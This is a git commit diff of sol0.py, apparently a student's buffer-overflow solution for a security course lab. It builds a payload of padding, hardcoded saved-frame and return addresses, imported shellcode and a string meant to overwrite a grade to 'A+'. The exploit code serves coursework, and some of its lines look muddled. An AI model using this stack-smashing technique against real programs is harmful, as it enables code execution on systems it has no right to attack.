ca77a7eef6e5b2131c2620e023d2f90a8162585a
Tate Reynolds <tate.reynolds@gmail.com>
2023-02-18 21:55:54 -0700

    sol0

--- sol0.py
+++ sol0.py
@@ -1,12 +1,13 @@
 import sys
 from struct import pack
-# from shellcode import shellcode
+from shellcode import shellcode
 
-# Implement your attack here!
-name = b'u0578264' + b'A' * 6  # pad the name with A's to fill the buffer
-payload = name + pack("<I", 0x804a020) + b'A' * 4 + \
-    b'A+'  # construct the payload
-print(payload)
+# Construct the payload
+name = b'A' * 14
+ebp = pack("<I", 0xffffd228)  # address of ebp on my system
+ret = pack("<I", 0x08048494)  # address of ret on my system
+grade = ret
+payload = name + ebp + ret + shellcode + b'A' * 4 + b'A+'  # set grade to A+
 
 # Launch the attack!
 sys.stdout.buffer.write(payload)
